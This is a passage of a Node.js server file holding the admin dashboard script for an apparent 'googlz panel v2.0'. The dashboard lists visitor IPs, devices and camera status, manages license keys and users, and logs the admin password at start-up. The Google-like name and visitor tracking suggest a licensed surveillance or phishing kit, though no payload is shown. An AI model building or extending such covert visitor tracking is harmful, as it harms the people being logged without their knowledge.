            '<span class="visit-ip">' + v.ip + '</span>' +
            '<span class="visit-device">' + v.device.browser + ' · ' + v.device.os + (v.device.isMobile ? ' · Mobile' : '') + '</span>' +
            cameraBadge +
            '<span class="visit-time">' + new Date(v.timestamp).toLocaleString() + '</span>' +
            '</div>';
        }).join('');
      }
      openModal('visits');
    });
}

// ─── LICENSE ACTIONS ───

function createLicense() {
  const duration = document.getElementById('license-duration').value;
  const maxUses = parseInt(document.getElementById('license-max-uses').value) || 0;
  const note = document.getElementById('license-note').value.trim();

  fetch('/' + ADMIN_PATH + '/licenses/create', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({duration, maxUses, note})
  }).then(r => r.json()).then(d => {
    if (d.success) {
      document.getElementById('generated-key').textContent = d.license.key;
      closeModal('create-license');
      openModal('license-result');
    } else {
      showToast(d.error || 'Failed to generate license', 'error');
    }
  });
}

function revokeLicense(key) {
  if (!confirm('Revoke license key ' + key + '?')) return;
  fetch('/' + ADMIN_PATH + '/licenses/revoke', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({key})
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('License revoked', 'success');
    else showToast('Failed', 'error');
    setTimeout(() => location.reload(), 1000);
  });
}

// ─── USER ACTIONS ───

function createUser() {
  const username = document.getElementById('user-username').value.trim();
  const password = document.getElementById('user-password').value.trim();
  const role = document.getElementById('user-role').value;

  if (!username || !password) {
    showToast('Username and password are required', 'error');
    return;
  }

  fetch('/' + ADMIN_PATH + '/users/create', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({username, password, role})
  }).then(r => r.json()).then(d => {
    if (d.success) {
      showToast('User created: ' + d.user, 'success');
      closeModal('create-user');
      setTimeout(() => location.reload(), 1500);
    } else {
      showToast(d.error || 'Failed to create user', 'error');
    }
  });
}

function deleteUser(username) {
  if (!confirm('Delete user ' + username + '?')) return;
  fetch('/' + ADMIN_PATH + '/users/delete', {
    method: 'POST', headers: {'Content-Type':'application/json'},
    body: JSON.stringify({username})
  }).then(r => r.json()).then(d => {
    if (d.success) showToast('User deleted', 'success');
    else showToast('Failed', 'error');
    setTimeout(() => location.reload(), 1000);
  });
}

document.addEventListener('DOMContentLoaded', function() {
  // Auto-refresh active sessions every 10 seconds
  setInterval(function() {
    fetch('/${ADMIN_PATH}/sessions/count')
      .then(r => r.json())
      .then(d => {
        // Update badge counts if needed
      })
      .catch(() => {});
  }, 10000);
});
</script>

<div class="footer-text">googlz panel v2.0 · All traffic logged</div>
</body></html>`);
}

// ═══════════════════════════════════════════════
//  START SERVER
// ═══════════════════════════════════════════════

app.listen(PORT, () => {
  console.log(`[googlz] Server running on port ${PORT}`);
  console.log(`[googlz] Admin panel: http://localhost:${PORT}/${ADMIN_PATH}`);
  console.log(`[googlz] Admin login: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
});
